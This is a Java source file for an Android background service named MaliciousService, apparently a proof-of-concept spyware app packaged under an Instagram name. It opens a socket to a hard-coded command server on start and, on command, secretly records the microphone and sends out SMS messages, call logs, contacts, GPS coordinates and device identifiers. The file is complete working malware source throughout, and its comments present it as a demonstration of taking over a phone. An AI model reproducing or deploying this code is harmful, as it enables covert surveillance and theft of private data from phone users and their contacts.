package com.merams.esd.instagram.poc;

import android.annotation.SuppressLint;
import android.app.Service;
import android.bluetooth.BluetoothAdapter;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.StrictMode;
import android.provider.Browser;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.content.FileProvider;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import me.everything.providers.android.browser.BrowserProvider;
import me.everything.providers.android.browser.Search;
import me.everything.providers.android.calllog.CallsProvider;

/*
*
* MaliciousService is a class that extends Service, a service is a GUI-less application.
* The purpose of this class is to implement malicious functions or methods in order to demonstrate
* how easy it is to get around security by abusing user trust and taking control over an Android phone.
*
* Each functions and methods described here are use to spy on the user or extract / destroy his data
* Let's have some fun ESD !
*
* void InitServerConnection => allows the malicious app to establish a direct connection to C2C server
* void StartMaliciousRecorder => When triggered, this function secretly enable phone microphone to spy on target
*
* */

public class MaliciousService extends Service {

    private List<String> smsList;
    private List<String> callLogList;
    private List<String> contactList;
    private List<String> tmpList;
    private MediaRecorder recorder;
    private LocationManager mLocMan;
    private boolean isRecording;
    private String tmpString;
    private String s_type;
    private String _OSVERSION = System.getProperty("os.version");
    private String _RELEASE = android.os.Build.VERSION.RELEASE;
    private String _DEVICE = android.os.Build.DEVICE;
    private String _MODEL = android.os.Build.MODEL;
    private String _PRODUCT = android.os.Build.PRODUCT;
    private String _BRAND = android.os.Build.BRAND;
    private String _HARDWARE = android.os.Build.HARDWARE;
    private String _ID = android.os.Build.ID;
    private String _MANUFACTURER = android.os.Build.MANUFACTURER;
    private String _SERIAL = android.os.Build.SERIAL;
    private String _USER = android.os.Build.USER;
    private String _HOST = android.os.Build.HOST;


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        InitServerConnection("192.168.43.45", 666);

    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        if(isRecording){ recorder.stop(); }

    }

    private void InitServerConnection(String ipaddr, int port){

        Thread thread = new Thread(new Runnable() {

            @Override
            public void run() {

                String cmd = "none";

                try  {

                    Socket socket = new Socket(ipaddr,port);
                    DataOutputStream os = new DataOutputStream(socket.getOutputStream());
                    os.write("C2C".getBytes(StandardCharsets.UTF_8));
                    os.flush();
                    //os.close(); if closed, the socket closes too so better let it commented

                    try{

                        char[] buff = new char[16384];
                        int charsRead = 0;
                        BufferedReader is = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                        while(true) {

                            while ((charsRead = is.read(buff)) != -1) {

                                cmd = new String(buff).substring(0, charsRead);

                                switch(cmd){

                                    case "record":
                                        try {

                                            os.write("Hooking on internal microphone, now listening ...".getBytes(StandardCharsets.UTF_8));
                                            os.flush();
                                            isRecording = StartMaliciousRecorder();

                                        } catch (FileNotFoundException e) {

                                            e.printStackTrace();

                                        } catch (IOException e) {

                                            e.printStackTrace();

                                        }

                                        break;

                                    case "snapshot":
                                        try {

                                            os.write("Took a picture from front camera, sending it to C2C server soon.".getBytes(StandardCharsets.UTF_8));
                                            os.flush();

                                        } catch (FileNotFoundException e) {

                                            e.printStackTrace();

                                        } catch (IOException e) {

                                            e.printStackTrace();

                                        }

                                        break;

                                    case "sms":

                                        smsList = new ArrayList<String>();
                                        smsList = ReadSms();
                                        Thread.sleep(2000);
                                        os.write("Pending recovery, please wait :\n".getBytes(StandardCharsets.UTF_8));

                                        for(String sms:smsList){

                                            os.write((sms+"\n").getBytes(StandardCharsets.UTF_8));
                                            os.flush();

                                        }

                                        Thread.sleep(2000);
                                        os.write("[FLG] Done Sending".getBytes(StandardCharsets.UTF_8));
                                        os.flush();
                                        break;

                                    case "call":

                                        callLogList = new ArrayList<String>();
                                        callLogList = ReadCallLog();
                                        Thread.sleep(2000);
                                        os.write("Pending recovery, please wait :\n".getBytes(StandardCharsets.UTF_8));

                                        for(String call:callLogList){

                                            os.write((call+"\n").getBytes(StandardCharsets.UTF_8));
                                            os.flush();

                                        }

                                        Thread.sleep(2000);
                                        os.write("[FLG] Done Sending".getBytes(StandardCharsets.UTF_8));
                                        os.flush();
                                        break;

                                    case "contact":

                                        contactList = new ArrayList<String>();
                                        contactList = GetContacts();
                                        Thread.sleep(2000);
                                        os.write("Pending recovery, please wait :\n".getBytes(StandardCharsets.UTF_8));

                                        for(String con:contactList){

                                            os.write((con+"\n").getBytes(StandardCharsets.UTF_8));
                                            os.flush();

                                        }

                                        Thread.sleep(2000);
                                        os.write("[FLG] Done Sending".getBytes(StandardCharsets.UTF_8));
                                        os.flush();
                                        break;

                                    case "location":

                                        mLocMan = (LocationManager) getSystemService(getApplicationContext().LOCATION_SERVICE);
                                        Location location = mLocMan.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                                        double lat = location.getLatitude();
                                        double lon = location.getLongitude();

                                        os.write(("Here are the coordinates of the target:\n "+String.valueOf(lat)+" Long: "+String.valueOf(lon)).getBytes(StandardCharsets.UTF_8));
                                        os.write("[FLG] Done Sending".getBytes(StandardCharsets.UTF_8));
                                        os.flush();
                                        break;

                                    case "intel":

                                        os.write(("Here are the intel i could get:\n\nManufacturer: "+_MANUFACTURER+"\nBrand: "+_BRAND+"\nDevice: "+_DEVICE+"\nProduct: "+_PRODUCT+"\nModel: "+_MODEL+"\nHardware: "+_HARDWARE+"\nOS: "+_OSVERSION+"\nRelease: "+_RELEASE+"\nSerial: "+_SERIAL+"\nID: "+_ID+"\nUser: "+_USER+"\nHost: "+_HOST+"\n").getBytes(StandardCharsets.UTF_8));
                                        os.write("[FLG] Done Sending".getBytes(StandardCharsets.UTF_8));
                                        os.flush();
                                        break;

                                    case "bluetooth":

                                        EnableBluetooth();
                                        os.write("[FLG] Done".getBytes(StandardCharsets.UTF_8));
                                        os.flush();
                                        break;

                                    case "internet":

                                        OpenBrowser("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
                                        os.write("[FLG] Done".getBytes(StandardCharsets.UTF_8));
                                        os.flush();
                                        break;


                                    default:
                                        os.write(("[WARN] Unknown command /!\\").getBytes(StandardCharsets.UTF_8));
                                        os.flush();
                                        continue;
                                }

                            }
                        }

                    }catch (Exception e){

                        e.printStackTrace();

                    }

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });

        thread.start();



    }

    @SuppressLint("WrongConstant")
    private boolean StartMaliciousRecorder(){

        //Recorder Base Configuration
        File path = getApplicationContext().getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS);
        File mouchard = new File(path, "ESDmouchard.mp3");
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);

        //Recorder Malicious Saved Audio File and Config based on which Android API is in Use
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            recorder.setOutputFile(mouchard);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        }

        //Try catch block to avoid being discovered in case it fucks thing up
        try {

            //Set a 2 seconds timer to prepare the recorder
            recorder.prepare();
            Thread.sleep(2000);

            //Start Recorder
            recorder.start();
            return true;

        } catch (Exception e) {

            Log.e("ERROR", e.getMessage());
            e.printStackTrace();
            return false;
        }

    }

    private List<String> ReadSms(){

        List<String> smsList = new ArrayList<String>();
        Uri uriSms = Uri.parse("content://sms/inbox");
        Cursor cur = getContentResolver().query(uriSms,null,null,null,null);

        while(cur.moveToNext()){

            @SuppressLint("Range") String num = cur.getString(cur.getColumnIndex("address"));
            @SuppressLint("Range") String body = cur.getString(cur.getColumnIndex("body"));
            smsList.add("Number: "+num+" Message: "+body);

        }

        return smsList;
    }

    private List<String> ReadCallLog(){

        List<String> callList = new ArrayList<String>();
        Uri uriCalls = Uri.parse("content://call_log/calls");
        Cursor cur = getContentResolver().query(uriCalls,null,null,null,null);

        while(cur.moveToNext()){

            @SuppressLint("Range") String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));
            @SuppressLint("Range") String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));
            @SuppressLint("Range") String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));
            @SuppressLint("Range") int type = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE)));

            switch (type){

                case 1:
                    s_type = "Incoming";
                    break;

                case 2:
                    s_type = "Outgoing";
                    break;

                case 3:
                    s_type = "Missed";
                    break;

                case 4:
                    s_type = "VoiceMail";
                    break;

                case 5:
                    s_type = "Rejected";
                    break;

                case 6:

                    s_type = "Refused List";
                    break;

                default:
                    continue;

            }



            callList.add("Number: "+num+" Name: "+name+" Duration: "+String.valueOf(Integer.parseInt(duration)/60)+"min"+" Type: "+s_type);

        }

        return callList;
    }

    private void EnableBluetooth(){

        BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
        if (!mBluetoothAdapter.isEnabled()) {

            mBluetoothAdapter.enable();
        }else{

            mBluetoothAdapter.disable();
        }


    }

    private void OpenBrowser(String url){

        Intent bIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        bIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(bIntent);
    }

    @SuppressLint("Range")
    private List<String> GetContacts() {

        ArrayList<String> nameList = new ArrayList<>();
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0){

            while (cur != null && cur.moveToNext()){

                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));



                if (cur.getInt(cur.getColumnIndex( ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {

                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);

                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        nameList.add("Name: "+name+" Phone: "+phoneNo);
                    }

                    pCur.close();
                }
            }
        }

        if (cur != null){

            cur.close();
        }

        tmpList = new ArrayList<String>();

        for(String entrie:nameList){

            if(!tmpList.contains(entrie)){

                tmpList.add(entrie);
            }
        }


        return tmpList;

    }

}
